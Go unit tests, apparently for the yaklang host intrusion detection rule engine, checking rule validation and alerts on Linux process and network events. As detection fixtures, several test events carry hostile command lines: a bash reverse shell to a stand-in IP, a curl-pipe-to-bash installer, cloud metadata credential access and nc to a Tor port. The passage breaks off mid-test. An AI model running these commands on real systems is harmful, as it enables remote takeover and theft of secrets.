//go:build hids

package rule

import (
	"errors"
	"strings"
	"testing"
	"time"

	"github.com/yaklang/yaklang/common/hids/model"
)

func TestNewEngineRejectsInvalidTemporaryRuleCondition(t *testing.T) {
	t.Parallel()

	_, err := NewEngine(model.DesiredSpec{
		TemporaryRules: []model.TemporaryRule{
			{
				RuleID:         "bad-rule",
				Enabled:        true,
				MatchEventType: "file.change",
				Severity:       "high",
				Condition:      "event.type ==",
			},
		},
	})
	if err == nil {
		t.Fatal("expected invalid rule condition error")
	}

	var validationErr *model.ValidationError
	if !errors.As(err, &validationErr) {
		t.Fatalf("expected validation error, got %v", err)
	}
	if validationErr.Field != "temporary_rules[0].condition" {
		t.Fatalf("unexpected validation field: %s", validationErr.Field)
	}
}

func TestNewEngineSkipsDisabledTemporaryRuleCondition(t *testing.T) {
	t.Parallel()

	_, err := NewEngine(model.DesiredSpec{
		TemporaryRules: []model.TemporaryRule{
			{
				RuleID:         "disabled-rule",
				Enabled:        false,
				MatchEventType: "file.change",
				Severity:       "high",
				Condition:      "event.type ==",
			},
		},
	})
	if err != nil {
		t.Fatalf("disabled temporary rule should not block engine creation: %v", err)
	}
}

func TestNewEngineRejectsUnknownBuiltinRuleSet(t *testing.T) {
	t.Parallel()

	_, err := NewEngine(model.DesiredSpec{
		BuiltinRuleSets: []string{"linux.unknown.baseline"},
	})
	if err == nil {
		t.Fatal("expected unknown builtin rule set error")
	}

	var validationErr *model.ValidationError
	if !errors.As(err, &validationErr) {
		t.Fatalf("expected validation error, got %v", err)
	}
	if validationErr.Field != "builtin_rule_sets[0]" {
		t.Fatalf("unexpected validation field: %s", validationErr.Field)
	}
}

func TestNewEngineAcceptsTemporaryRuleConditionWithKnownNetworkDataFields(t *testing.T) {
	t.Parallel()

	_, err := NewEngine(model.DesiredSpec{
		TemporaryRules: []model.TemporaryRule{
			{
				RuleID:         "tmp-network-enrich-fields",
				Enabled:        true,
				MatchEventType: model.EventTypeNetworkConnect,
				Severity:       "medium",
				Condition:      "data.direction == 'outbound' && data.dest_scope == 'public' && list.Contains(data.process_roles, 'shell') && data.connection_age_seconds >= 0",
			},
		},
	})
	if err != nil {
		t.Fatalf("temporary rule with known network data fields should validate: %v", err)
	}
}

func TestNewEngineRejectsInvalidTemporaryRuleAction(t *testing.T) {
	t.Parallel()

	_, err := NewEngine(model.DesiredSpec{
		TemporaryRules: []model.TemporaryRule{
			{
				RuleID:         "tmp-invalid-action",
				Enabled:        true,
				MatchEventType: model.EventTypeProcessExec,
				Severity:       "medium",
				Condition:      "true",
				Action:         "{\"title\":",
			},
		},
	})
	if err == nil {
		t.Fatal("expected invalid rule action error")
	}

	var validationErr *model.ValidationError
	if !errors.As(err, &validationErr) {
		t.Fatalf("expected validation error, got %v", err)
	}
	if validationErr.Field != "temporary_rules[0].action" {
		t.Fatalf("unexpected validation field: %s", validationErr.Field)
	}
}

func TestNewEngineRejectsInvalidTemporaryRuleActionScanMatch(t *testing.T) {
	t.Parallel()

	_, err := NewEngine(model.DesiredSpec{
		TemporaryRules: []model.TemporaryRule{
			{
				RuleID:         "tmp-invalid-scan-match",
				Enabled:        true,
				MatchEventType: model.EventTypeFileChange,
				Severity:       "medium",
				Condition:      "file.path != ''",
				Action:         `{"evidence_requests":[{"kind":"directory_scan","target":"/tmp","metadata":{"entry_match":"artifact.IsELF(entry.artifact"}}]}`,
			},
		},
	})
	if err == nil {
		t.Fatal("expected invalid action scan-match validation error")
	}
	validationErr, ok := err.(*model.ValidationError)
	if !ok {
		t.Fatalf("expected validation error, got %T", err)
	}
	if validationErr.Field != "temporary_rules[0].action" {
		t.Fatalf("unexpected validation field: %s", validationErr.Field)
	}
	if !strings.Contains(validationErr.Reason, "entry_match") {
		t.Fatalf("expected entry_match validation detail, got %q", validationErr.Reason)
	}
}

func TestEngineEvaluateMatchesTemporaryProcessRule(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		TemporaryRules: []model.TemporaryRule{
			{
				RuleID:         "tmp-suspicious-shell-under-nginx",
				Enabled:        true,
				MatchEventType: "process.exec",
				Severity:       "high",
				Condition:      "event.type == 'process.exec' && process.parent_name == 'nginx' && str.RegexpMatch('(/bin/sh|/bin/bash)$', process.image) && list.Contains(tags, 'process')",
				Tags:           []string{"tmp-rule", "shell"},
			},
		},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      "process.exec",
		Source:    "ebpf",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"process", "linux"},
		Process: &model.Process{
			PID:           4321,
			ParentPID:     123,
			Image:         "/bin/sh",
			Command:       "/bin/sh -c id",
			ParentName:    "nginx",
			ParentImage:   "/usr/sbin/nginx",
			ParentCommand: "nginx: worker process",
		},
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}

	alert := alerts[0]
	if alert.RuleID != "tmp-suspicious-shell-under-nginx" {
		t.Fatalf("unexpected rule id: %s", alert.RuleID)
	}
	if alert.Severity != "high" {
		t.Fatalf("unexpected severity: %s", alert.Severity)
	}
	if !containsString(alert.Tags, "tmp-rule") || !containsString(alert.Tags, "process") {
		t.Fatalf("unexpected alert tags: %#v", alert.Tags)
	}

	eventDetail, ok := alert.Detail["event"].(map[string]any)
	if !ok {
		t.Fatalf("expected event detail map, got %#v", alert.Detail["event"])
	}
	if eventDetail["type"] != "process.exec" {
		t.Fatalf("unexpected event type detail: %#v", eventDetail["type"])
	}
	processDetail, ok := eventDetail["process"].(map[string]any)
	if !ok {
		t.Fatalf("expected process detail map, got %#v", eventDetail["process"])
	}
	if processDetail["parent_name"] != "nginx" {
		t.Fatalf("unexpected parent name detail: %#v", processDetail["parent_name"])
	}
	if processDetail["parent_image"] != "/usr/sbin/nginx" {
		t.Fatalf("unexpected parent image detail: %#v", processDetail["parent_image"])
	}
	if processDetail["parent_command"] != "nginx: worker process" {
		t.Fatalf("unexpected parent command detail: %#v", processDetail["parent_command"])
	}
	parentDetail, ok := eventDetail["parent"].(map[string]any)
	if !ok {
		t.Fatalf("expected parent detail map, got %#v", eventDetail["parent"])
	}
	if parentDetail["image"] != "/usr/sbin/nginx" || parentDetail["command"] != "nginx: worker process" {
		t.Fatalf("unexpected parent detail: %#v", parentDetail)
	}
}

func TestEngineEvaluateUsesTemporaryRuleTitleAndMetadata(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		TemporaryRules: []model.TemporaryRule{
			{
				RuleID:         "tmp-process-title-metadata",
				Title:          "Unexpected shell under nginx",
				Description:    "Capture shell execution under a web-facing parent process.",
				Enabled:        true,
				MatchEventType: model.EventTypeProcessExec,
				Severity:       "high",
				Condition:      "process.parent_name == 'nginx' && str.HasSuffix(process.image, 'sh')",
				Tags:           []string{"temporary", "process", "shell"},
				Metadata: map[string]any{
					"template_id": "process-path-whitelist",
					"author":      "console",
				},
			},
		},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeProcessExec,
		Source:    "ebpf.process",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"process", "linux"},
		Process: &model.Process{
			PID:        4321,
			ParentPID:  123,
			Image:      "/bin/sh",
			Command:    "/bin/sh -c id",
			ParentName: "nginx",
		},
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}

	alert := alerts[0]
	if alert.Title != "Unexpected shell under nginx" {
		t.Fatalf("unexpected alert title: %q", alert.Title)
	}
	if alert.Detail["source"] != "temporary" {
		t.Fatalf("unexpected alert source detail: %#v", alert.Detail["source"])
	}
	if alert.Detail["rule_description"] != "Capture shell execution under a web-facing parent process." {
		t.Fatalf("unexpected rule description: %#v", alert.Detail["rule_description"])
	}
	ruleMetadata, ok := alert.Detail["rule_metadata"].(map[string]any)
	if !ok {
		t.Fatalf("expected rule_metadata map, got %#v", alert.Detail["rule_metadata"])
	}
	if ruleMetadata["template_id"] != "process-path-whitelist" {
		t.Fatalf("unexpected template_id: %#v", ruleMetadata["template_id"])
	}
}

func TestEngineEvaluateAppliesTemporaryRuleActionOverrides(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		TemporaryRules: []model.TemporaryRule{
			{
				RuleID:         "tmp-process-action",
				Title:          "Base title",
				Description:    "Base description",
				Enabled:        true,
				MatchEventType: model.EventTypeProcessExec,
				Severity:       "medium",
				Condition:      "process.parent_name == 'nginx'",
				Action:         `{"title":"Action title","severity":"critical","tags":["action-tag","triaged"],"detail":{"summary":"nginx spawned shell","owner":"rule-action"},"evidence_requests":[{"kind":"process_tree","target":"process","reason":"collect lineage","metadata":{"pid":process.pid}},{"kind":"file","reason":"capture executable","path":process.image}]}`,
				Tags:           []string{"temporary", "process"},
			},
		},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeProcessExec,
		Source:    "ebpf.process",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"process", "linux"},
		Process: &model.Process{
			PID:        4321,
			ParentPID:  123,
			Image:      "/bin/sh",
			Command:    "/bin/sh -c id",
			ParentName: "nginx",
		},
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}

	alert := alerts[0]
	if alert.Title != "Action title" {
		t.Fatalf("unexpected alert title: %q", alert.Title)
	}
	if alert.Severity != "critical" {
		t.Fatalf("unexpected alert severity: %q", alert.Severity)
	}
	if !containsString(alert.Tags, "temporary") || !containsString(alert.Tags, "action-tag") {
		t.Fatalf("unexpected alert tags: %#v", alert.Tags)
	}
	if alert.Detail["action_script"] == "" {
		t.Fatalf("expected action script in detail: %#v", alert.Detail)
	}
	if alert.Detail["summary"] != "nginx spawned shell" {
		t.Fatalf("unexpected summary: %#v", alert.Detail["summary"])
	}
	evidenceRequests, ok := alert.Detail["evidence_requests"].([]map[string]any)
	if !ok || len(evidenceRequests) != 2 {
		t.Fatalf("unexpected evidence requests: %#v", alert.Detail["evidence_requests"])
	}
	firstRequest := evidenceRequests[0]
	if firstRequest["kind"] != "process_tree" {
		t.Fatalf("unexpected evidence kind: %#v", firstRequest["kind"])
	}
	firstMetadata, ok := firstRequest["metadata"].(map[string]any)
	if !ok || firstMetadata["pid"] != 4321 {
		t.Fatalf("unexpected first evidence metadata: %#v", firstRequest["metadata"])
	}
	secondRequest := evidenceRequests[1]
	metadata, ok := secondRequest["metadata"].(map[string]any)
	if !ok || metadata["path"] != "/bin/sh" {
		t.Fatalf("unexpected evidence metadata: %#v", secondRequest["metadata"])
	}
}

func TestEngineEvaluateMatchesBuiltinProcessRule(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		BuiltinRuleSets: []string{"linux.process.baseline"},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeProcessExec,
		Source:    "ebpf",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"process", "linux"},
		Process: &model.Process{
			PID:        4321,
			ParentPID:  123,
			Image:      "/bin/sh",
			Command:    "/bin/sh -c id",
			ParentName: "nginx",
		},
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}

	alert := alerts[0]
	if alert.RuleID != "linux.process.shell_under_web_parent" {
		t.Fatalf("unexpected rule id: %s", alert.RuleID)
	}
	if alert.Severity != "high" {
		t.Fatalf("unexpected severity: %s", alert.Severity)
	}
	if !containsString(alert.Tags, "builtin") || !containsString(alert.Tags, "process") {
		t.Fatalf("unexpected alert tags: %#v", alert.Tags)
	}
}

func TestEngineEvaluateMatchesBuiltinProcessDownloadPipeShellRule(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		BuiltinRuleSets: []string{"linux.process.baseline"},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeProcessExec,
		Source:    "ebpf",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"process", "linux"},
		Process: &model.Process{
			PID:           4321,
			ParentPID:     1,
			Name:          "sh",
			Username:      "root",
			Image:         "/bin/sh",
			Command:       "sh -c curl -fsSL https://example.test/install.sh | bash",
			ParentName:    "sshd",
			ParentImage:   "/usr/sbin/sshd",
			ParentCommand: "/usr/sbin/sshd -D",
		},
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}
	if alerts[0].RuleID != "linux.process.download_pipe_shell" {
		t.Fatalf("unexpected rule id: %s", alerts[0].RuleID)
	}
	if alerts[0].Detail["parent_name"] != "sshd" {
		t.Fatalf("unexpected parent name: %#v", alerts[0].Detail["parent_name"])
	}
	if alerts[0].Detail["parent_image"] != "/usr/sbin/sshd" {
		t.Fatalf("unexpected parent image: %#v", alerts[0].Detail["parent_image"])
	}
	if alerts[0].Detail["parent_command"] != "/usr/sbin/sshd -D" {
		t.Fatalf("unexpected parent command: %#v", alerts[0].Detail["parent_command"])
	}
}

func TestEngineEvaluateMatchesBuiltinProcessReverseShellRule(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		BuiltinRuleSets: []string{"linux.process.baseline"},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeProcessExec,
		Source:    "ebpf",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"process", "linux"},
		Process: &model.Process{
			PID:        4321,
			ParentPID:  1,
			Name:       "bash",
			Username:   "root",
			Image:      "/bin/bash",
			Command:    "bash -c 'bash -i >& /dev/tcp/203.0.113.10/4444 0>&1'",
			ParentName: "sshd",
		},
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}
	if alerts[0].RuleID != "linux.process.reverse_shell_command" {
		t.Fatalf("unexpected rule id: %s", alerts[0].RuleID)
	}
	if alerts[0].Severity != "critical" {
		t.Fatalf("unexpected severity: %s", alerts[0].Severity)
	}
}

func TestEngineEvaluateMatchesBuiltinProcessSetuidSetgidBitRule(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		BuiltinRuleSets: []string{"linux.process.baseline"},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeProcessExec,
		Source:    "ebpf",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"process", "linux"},
		Process: &model.Process{
			PID:      4321,
			Name:     "chmod",
			Username: "root",
			Image:    "/usr/bin/chmod",
			Command:  "chmod u+s /tmp/helper",
		},
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}
	if alerts[0].RuleID != "linux.process.setuid_setgid_bit" {
		t.Fatalf("unexpected rule id: %s", alerts[0].RuleID)
	}
}

func TestEngineEvaluateMatchesBuiltinProcessPersistenceCommandRule(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		BuiltinRuleSets: []string{"linux.process.baseline"},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeProcessExec,
		Source:    "ebpf",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"process", "linux"},
		Process: &model.Process{
			PID:      4321,
			Name:     "systemctl",
			Username: "root",
			Image:    "/usr/bin/systemctl",
			Command:  "systemctl enable evil.service",
		},
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}
	if alerts[0].RuleID != "linux.process.persistence_command" {
		t.Fatalf("unexpected rule id: %s", alerts[0].RuleID)
	}
}

func TestEngineEvaluateMatchesBuiltinProcessAccountManagementCommandRule(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		BuiltinRuleSets: []string{"linux.process.baseline"},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeProcessExec,
		Source:    "ebpf",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"process", "linux"},
		Process: &model.Process{
			PID:      4321,
			Name:     "usermod",
			Username: "root",
			Image:    "/usr/sbin/usermod",
			Command:  "usermod -aG sudo deploy",
		},
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}
	if alerts[0].RuleID != "linux.process.account_management_command" {
		t.Fatalf("unexpected rule id: %s", alerts[0].RuleID)
	}
}

func TestEngineEvaluateMatchesBuiltinNetworkRule(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		BuiltinRuleSets: []string{"linux.network.baseline"},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeNetworkConnect,
		Source:    "ebpf",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"network", "linux"},
		Network: &model.Network{
			Protocol:      "tcp",
			DestAddress:   "8.8.8.8",
			DestPort:      4444,
			SourceAddress: "10.10.10.5",
			SourcePort:    49152,
		},
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}

	alert := alerts[0]
	if alert.RuleID != "linux.network.public_suspicious_port" {
		t.Fatalf("unexpected rule id: %s", alert.RuleID)
	}
	if alert.Severity != "high" {
		t.Fatalf("unexpected severity: %s", alert.Severity)
	}
}

func TestEngineEvaluateMatchesBuiltinShellPublicEgressRule(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		BuiltinRuleSets: []string{"linux.network.baseline"},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeNetworkConnect,
		Source:    "ebpf",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"network", "linux"},
		Process: &model.Process{
			PID:        4321,
			ParentPID:  1,
			Name:       "bash",
			Image:      "/bin/bash",
			Command:    "/bin/bash -lc curl https://example.com",
			ParentName: "systemd",
		},
		Network: &model.Network{
			Protocol:      "tcp",
			DestAddress:   "8.8.8.8",
			DestPort:      443,
			SourceAddress: "10.10.10.5",
			SourcePort:    49152,
		},
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}
	if alerts[0].RuleID != "linux.network.shell_public_egress" {
		t.Fatalf("unexpected rule id: %s", alerts[0].RuleID)
	}
}

func TestEngineEvaluateMatchesBuiltinWebRemoteAdminEgressRule(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		BuiltinRuleSets: []string{"linux.network.baseline"},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeNetworkConnect,
		Source:    "ebpf",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"network", "linux"},
		Process: &model.Process{
			PID:        4321,
			ParentPID:  123,
			Name:       "curl",
			Image:      "/usr/bin/curl",
			Command:    "curl 203.0.113.10:22",
			ParentName: "nginx",
		},
		Network: &model.Network{
			Protocol:      "tcp",
			DestAddress:   "203.0.113.10",
			DestPort:      22,
			SourceAddress: "10.10.10.5",
			SourcePort:    49152,
		},
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}
	if alerts[0].RuleID != "linux.network.web_process_remote_admin_egress" {
		t.Fatalf("unexpected rule id: %s", alerts[0].RuleID)
	}
}

func TestEngineEvaluateMatchesBuiltinUnexpectedAdminAcceptRule(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		BuiltinRuleSets: []string{"linux.network.baseline"},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeNetworkAccept,
		Source:    "ebpf",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"network", "linux"},
		Process: &model.Process{
			PID:        9876,
			ParentPID:  1,
			Name:       "python3",
			Image:      "/usr/bin/python3",
			Command:    "python3 -m http.server 22",
			ParentName: "systemd",
		},
		Network: &model.Network{
			Protocol:      "tcp",
			SourceAddress: "10.0.0.5",
			SourcePort:    22,
			DestAddress:   "8.8.8.8",
			DestPort:      51123,
		},
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}
	if alerts[0].RuleID != "linux.network.unexpected_public_admin_accept" {
		t.Fatalf("unexpected rule id: %s", alerts[0].RuleID)
	}
}

func TestEngineEvaluateMatchesBuiltinInterpreterRemoteAdminEgressRule(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		BuiltinRuleSets: []string{"linux.network.baseline"},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeNetworkConnect,
		Source:    "ebpf",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"network", "linux"},
		Process: &model.Process{
			PID:        9876,
			ParentPID:  1,
			Name:       "python3",
			Image:      "/usr/bin/python3",
			Command:    "python3 reverse.py",
			ParentName: "systemd",
		},
		Network: &model.Network{
			Protocol:      "tcp",
			DestAddress:   "203.0.113.10",
			DestPort:      22,
			SourceAddress: "10.10.10.5",
			SourcePort:    49152,
		},
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}
	if alerts[0].RuleID != "linux.network.interpreter_remote_admin_egress" {
		t.Fatalf("unexpected rule id: %s", alerts[0].RuleID)
	}
}

func TestEngineEvaluateMatchesBuiltinToolingProxyTorEgressRule(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		BuiltinRuleSets: []string{"linux.network.baseline"},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeNetworkConnect,
		Source:    "ebpf",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"network", "linux"},
		Process: &model.Process{
			PID:        4321,
			ParentPID:  1,
			Name:       "bash",
			Image:      "/bin/bash",
			Command:    "/bin/bash -lc nc 203.0.113.30 9050",
			ParentName: "systemd",
		},
		Network: &model.Network{
			Protocol:      "tcp",
			DestAddress:   "203.0.113.30",
			DestPort:      9050,
			SourceAddress: "10.10.10.5",
			SourcePort:    49152,
		},
	})
	if len(alerts) == 0 {
		t.Fatal("expected at least one alert")
	}
	found := false
	for _, alert := range alerts {
		if alert.RuleID == "linux.network.tooling_proxy_tor_egress" {
			found = true
			break
		}
	}
	if !found {
		t.Fatalf("expected tooling proxy/tor rule in alerts: %#v", alerts)
	}
}

func TestEngineEvaluateMatchesBuiltinMetadataServiceAccessRule(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		BuiltinRuleSets: []string{"linux.network.baseline"},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeNetworkConnect,
		Source:    "ebpf",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"network", "linux"},
		Process: &model.Process{
			PID:        1234,
			ParentPID:  1,
			Name:       "bash",
			Image:      "/bin/bash",
			Command:    "/bin/bash -lc curl -H Metadata:true http://169.254.169.254/latest/meta-data/",
			ParentName: "systemd",
		},
		Network: &model.Network{
			Protocol:      "tcp",
			DestAddress:   "169.254.169.254",
			DestPort:      80,
			SourceAddress: "10.10.10.5",
			SourcePort:    49152,
		},
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}
	if alerts[0].RuleID != "linux.network.metadata_service_access" {
		t.Fatalf("unexpected rule id: %s", alerts[0].RuleID)
	}
}

func TestEngineEvaluateMatchesBuiltinWebProxyTorEgressRule(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		BuiltinRuleSets: []string{"linux.network.baseline"},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeNetworkConnect,
		Source:    "ebpf",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"network", "linux"},
		Process: &model.Process{
			PID:        4321,
			ParentPID:  1,
			Name:       "nginx",
			Image:      "/usr/sbin/nginx",
			Command:    "nginx: worker process",
			ParentName: "systemd",
		},
		Network: &model.Network{
			Protocol:      "tcp",
			DestAddress:   "203.0.113.30",
			DestPort:      9050,
			SourceAddress: "10.10.10.5",
			SourcePort:    49152,
		},
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}
	if alerts[0].RuleID != "linux.network.web_process_proxy_tor_egress" {
		t.Fatalf("unexpected rule id: %s", alerts[0].RuleID)
	}
	if alerts[0].Detail["dest_service"] != "tor-socks" {
		t.Fatalf("unexpected dest service: %#v", alerts[0].Detail["dest_service"])
	}
}

func TestEngineEvaluateMatchesBuiltinPublicDataServiceEgressRule(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		BuiltinRuleSets: []string{"linux.network.baseline"},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeNetworkConnect,
		Source:    "ebpf",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"network", "linux"},
		Process: &model.Process{
			PID:        4321,
			ParentPID:  1,
			Name:       "python3",
			Image:      "/usr/bin/python3",
			Command:    "python3 dump.py --host 203.0.113.50 --port 5432",
			ParentName: "systemd",
		},
		Network: &model.Network{
			Protocol:      "tcp",
			SourceAddress: "10.10.10.5",
			SourcePort:    49152,
			DestAddress:   "203.0.113.50",
			DestPort:      5432,
		},
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}
	if alerts[0].RuleID != "linux.network.public_data_service_egress" {
		t.Fatalf("unexpected rule id: %s", alerts[0].RuleID)
	}
	if alerts[0].Detail["dest_service"] != "postgres" {
		t.Fatalf("unexpected dest service: %#v", alerts[0].Detail["dest_service"])
	}
}

func TestEngineEvaluateMatchesBuiltinPublicKubernetesAPIEgressRule(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		BuiltinRuleSets: []string{"linux.network.baseline"},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeNetworkConnect,
		Source:    "ebpf",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"network", "linux"},
		Process: &model.Process{
			PID:        4321,
			ParentPID:  1,
			Name:       "curl",
			Image:      "/usr/bin/curl",
			Command:    "curl -k https://203.0.113.40:6443/apis",
			ParentName: "systemd",
		},
		Network: &model.Network{
			Protocol:      "tcp",
			DestAddress:   "203.0.113.40",
			DestPort:      6443,
			SourceAddress: "10.10.10.5",
			SourcePort:    49152,
		},
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}
	if alerts[0].RuleID != "linux.network.public_kubernetes_api_egress" {
		t.Fatalf("unexpected rule id: %s", alerts[0].RuleID)
	}
	if alerts[0].Detail["dest_service"] != "k8s-api" {
		t.Fatalf("unexpected dest service: %#v", alerts[0].Detail["dest_service"])
	}
}

func TestEngineEvaluateMatchesBuiltinUnexpectedPublicDataServiceAcceptRule(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		BuiltinRuleSets: []string{"linux.network.baseline"},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeNetworkAccept,
		Source:    "ebpf",
		Timestamp: time.Unix(1712606400, 0).UTC(),
		Tags:      []string{"network", "linux"},
		Process: &model.Process{
			PID:        9876,
			ParentPID:  1,
			Name:       "python3",
			Image:      "/usr/bin/python3",
			Command:    "python3 -m http.server 3306",
			ParentName: "systemd",
		},
		Network: &model.Network{
			Protocol:      "tcp",
			SourceAddress: "10.0.0.5",
			SourcePort:    3306,
			DestAddress:   "8.8.8.8",
			DestPort:      51123,
		},
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}
	if alerts[0].RuleID != "linux.network.unexpected_public_data_service_accept" {
		t.Fatalf("unexpected rule id: %s", alerts[0].RuleID)
	}
}

func TestEngineEvaluateMatchesBuiltinLongLivedPublicRemoteAdminSessionRule(t *testing.T) {
	t.Parallel()

	engine, err := NewEngine(model.DesiredSpec{
		BuiltinRuleSets: []string{"linux.network.baseline"},
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}

	alerts := engine.Evaluate(model.Event{
		Type:      model.EventTypeNetworkClose,
		Source:    "ebpf",
		Timestamp: time.Unix(1712607000, 0).UTC(),
		Tags:      []string{"network", "linux", "close"},
		Process: &model.Process{
			PID:        9876,
			ParentPID:  1,
			Name:       "python3",
			Image:      "/usr/bin/python3",
			Command:    "python3 reverse.py",
			ParentName: "systemd",
		},
		Network: &model.Network{
			Protocol:        "tcp",
			DestAddress:     "203.0.113.10",
			DestPort:        22,
			SourceAddress:   "10.10.10.5",
			SourcePort:      49152,
			ConnectionState: "closed",
		},
		Data: map[string]any{
			"connection_age_seconds":    int64(900),
			"previous_connection_state": "ESTABLISHED",
		},
	})
